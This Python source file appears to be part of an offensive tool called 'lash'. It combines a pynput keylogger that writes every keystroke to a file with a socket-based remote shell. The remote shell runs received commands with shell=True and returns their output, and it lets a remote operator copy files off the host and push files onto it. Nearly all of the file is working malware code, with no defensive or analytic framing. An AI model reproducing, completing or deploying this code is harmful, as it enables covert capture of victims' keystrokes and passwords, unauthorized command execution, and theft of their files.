import os
import subprocess
from lash.Exportables.fileTools import *
from rich import print
from rich.table import Table
from pynput.keyboard import Key


def key_down(key):
    log = open('Keylogger.txt', mode='a')
    try:
        log.write(key.char)
    except AttributeError:  # Special keys
        if key == Key.space:
            log.write(' ')
        elif key == Key.backspace:
            log.write(' <bkp> ')
        elif key == Key.shift:
            log.write(' <shift> ')
        elif key == Key.ctrl_l:
            log.write(' <ctrl_l> ')
        elif key == Key.enter:
            log.write(' <enter> \n')
        else:
            log.write(f' <{key}> ')


def key_down_pass(key):
    print(key)


def key_up(key):
    if key == Key.f3:  # Hotkey to end process
        return False


# Injection functions


def port_verify(port):
    try:
        port = int(port)
        return port
    except ValueError:
        print(f'[red]Invalid port[/red] [{port}], the value needs be a integer number like 4254 or 8234')
        quit(1)


def injection_client_msg():
    table = Table(box=None)
    table.add_column('Command', justify='left', style='bright_green')
    table.add_column('Description', justify='left', style='green')

    table.add_row('-chdir <path>', 'Change the the remote directory')
    table.add_row('-copy <path_host>', 'Copy a file from host to your machine')
    table.add_row('-move <path_local>', 'Move a file from your machine to host')
    table.add_row('-kill', 'Kill server all, connections lost')

    table.caption = 'Use this commands instead the originals to avoid problems'
    return table


def custom_server_manager(conn, buffer, path, command, command_arg1):
    os.chdir(path)
    if command_arg1 == '-chdir':
        try:
            path = command.split()[1]
        except IndexError:
            pass
        try:
            os.chdir(path)
        except FileNotFoundError:
            pass
        return True
    elif command_arg1 == '-copy':
        file_name = ''.join(command[len(command_arg1):]).strip()
        try:
            with open(file_name, 'rb') as file:
                content = file.read()
                conn.sendall(content)
        except FileNotFoundError:
                content = '404File not found'
                conn.send(bytes(content, 'utf-8'))
        return True
    elif command_arg1 == '-move':
        file_name = conn.recv(buffer).decode('utf-8')
        file_data = conn.recv(buffer)
        if file_data.decode() == '404File not found':
            msg = f'File \'{file_name}\' not found'
            conn.send(bytes(msg, 'utf-8'))
        else:
            with open(file_name, 'wb') as file:
                file.write(file_data)
            msg = f'File: {file_name} has been copied to {os.getcwd()}'
            conn.send(bytes(msg, 'utf-8'))
        return True
    elif command == '-kill':
        os.system('cls')
        quit(0)
    elif command == '-getpath':
        conn.send(bytes(os.getcwd(), 'utf-8'))
        return True
    else:
        return False


def custom_client_manager(s, buffer, path, command, command_arg1):
    if command_arg1 == '-chdir':
        s.sendall(bytes(command, 'utf-8'))
        return True
    elif command_arg1 == '-copy':
        s.sendall(bytes(command, 'utf-8'))
        file_name = ''.join(command[len(command_arg1):]).strip()
        file_data = s.recv(buffer)
        try:
            if file_data.decode('utf-8')[:17] == '404File not found':
                print(f'[red]File[/red] \'{file_name}\' [red]not found[/red]')
                s.sendall(bytes(command, 'utf-8'))
                return True
        except UnicodeDecodeError:
            pass
        with open(file_name, 'wb') as file:
            file.write(file_data)
        print(f'{file_name} has been copied to {os.getcwd()}')
        s.sendall(bytes(command, 'utf-8'))
        return True
    elif command_arg1 == '-move':
        s.sendall(bytes(command, 'utf-8'))
        file_name = ''.join(command[len(command_arg1):]).strip()
        s.send(bytes(file_name, 'utf-8'))
        try:
            with open(file_name, 'rb') as file:
                content = file.read()
                s.send(content)
        except FileNotFoundError:
            s.send(bytes('404File not found', 'utf-8'))
        msg = s.recv(buffer).decode('utf-8')
        print(msg)
        return True
    elif command_arg1 == '-kill':
        s.sendall(bytes(command, 'utf-8'))
        quit(0)
    else:
        return False


def handle_connection(conn, buffer):
    while True:
        actual_path = os.getcwd()
        conn.send(bytes(actual_path, 'utf-8'))
        try:
            command = conn.recv(buffer).decode('utf-8').strip()
        except ConnectionResetError:
            continue
        except ConnectionAbortedError:
            continue
        try:
            command_arg1 = command.strip().split()[0]
        except IndexError:
            command_arg1 = command
        if not custom_server_manager(conn, buffer, os.getcwd(), command, command_arg1):
            output = subprocess.run(command, shell=True, capture_output=True, text=True).__dict__
            if len(output['stdout']) == 0:
                conn.send(bytes('[red]Command not found[/red] [green]Or blank response[/green]', 'utf-8'))
            else:
                conn.send(bytes(output['stdout'], 'utf-8'))
